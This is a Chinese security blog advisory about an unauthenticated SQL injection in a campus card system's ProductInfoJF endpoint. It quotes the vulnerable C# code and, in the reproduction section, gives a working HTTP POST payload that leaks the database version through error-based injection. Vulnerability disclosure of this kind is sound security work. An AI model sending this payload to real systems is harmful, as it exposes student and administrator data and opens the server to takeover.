---
title: "新中新校园卡管理系统 ProductInfoJF SQL注入漏洞"
source: https://mrxn.net/jswz/ProductInfoJF-sqli.html
asset_dir: assets/新中新校园卡管理系统-productinfojf-sql注入漏洞
---

# 新中新校园卡管理系统 ProductInfoJF SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/21 19:31
* 1684浏览
* [0评论](#comment)
* 22分钟阅读

深入探索

服务器

身份验证

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

新中新中小学智慧校园信息管理系统 ProductInfoJF 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL 注入")漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 漏洞分析

ProductInfoJF 主要业务代码逻辑实现如下：

```
public System.Web.Mvc.ActionResult ProductInfoJF(string pdid)
    {
      try
      {
        int hour = DateTime.Now.Hour;
        if (hour >= 22 || hour <= 2)
          return (System.Web.Mvc.ActionResult) this.Content("微信充值时间【02:00-22:00】.");
        object obj1 = this.IocBase.RECHARGERECService.ExecSqlQuery("declare @ACCNO int,@Name varchar(16),@PayMoney decimal(18,2),@Title varchar(40), @DSMAID int, @YSMAID int, @RECIVE int, @APPID varchar(80), @WxPayMchID varchar(32), @WxPayMchKey  varchar(32), @WxPayState int, @ScList bigint, @AreaId int, @MID int select @Title = pb.TITLE, @PayMoney = case when pb.PAYMONEY>0 then pb.PAYMONEY else pd.PAYMONEY end, @ACCNO = pd.ACCOUNTNO, @Name = tr.Name, @DSMAID = m.DSMAID, @YSMAID = m.MAID, @RECIVE = m.WxPayRecive, @WxPayMchID = m.WxPayMchID, @WxPayMchKey = m.WxPayMchKey, @WxPayState = m.PayTypeState, @MID = m.MID, @ScList = m.LIST, @AreaId = m.AreaID from MERCHANTACC m, PAYMENTBILL pb, PAYMENTDEAIL pd, TabRecord tr where pd.PDID = " + pdid + " and pd.PBID = pb.PBID and pb.MAID = m.MAID and pd.ACCOUNTNO = tr.AccountNo if (@RECIVE = 0) begin select @WxPayMchID = m.WxPayMchID,@WxPayMchKey = m.WxPayMchKey,@WxPayState = m.PayTypeState,@MID = m.MID,@ScList = m.LIST,@AreaId = m.AreaID from MERCHANTACC m,YWPLATFORM y where m.MAID = @DSMAID end if (@MID is not null) begin select @APPID = APPID from MERCHANT where MID = @MID end else if (@ScList is not null) begin select @APPID = APPID from SCHOOLRUNSET where List = @ScList end else if (@AreaId is not null) begin select @APPID = APPID from YWPLATFORM where areaid = @AreaId end select @ACCNO as ACCNO,@Name as Name,@Title as Title,@PayMoney as PayMoney,@WxPayState as WxPayState, @RECIVE as RECIVE,@DSMAID as DSMAID,@YSMAID as YSMAID,@APPID as AppID,@WxPayMchID as WxPayMchID,@WxPayMchKey as WxPayMchKey")[0];
```

可以看到 将 `pdid` 直接拼接进SQL语句，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")。

# 漏洞复现

```
POST /WeiXin/ProductInfoJF HTTP/1.1
Host: test.mrxn.net
Content-Type: application/x-www-form-urlencoded

pdid=-1/user--
```

[![新中新校园卡管理系统 ProductInfoJF SQL注入漏洞](images/img-001-2197de7c416a.webp)](https://image.mrxn.net/78a8aaa77a674c09bbf0b0ad6564441a.webp)

通过报错注入成功回显数据库版本信息

代码安全审计

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.漏洞分析](#toc-2-)
* [3.漏洞复现](#toc-3-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[新中新校园卡管理系统 ProductInfoJF SQL注入漏洞](https://mrxn.net/jswz/ProductInfoJF-sqli.html)  
文章链接：<https://mrxn.net/jswz/ProductInfoJF-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ProductInfoJF-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞预警服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


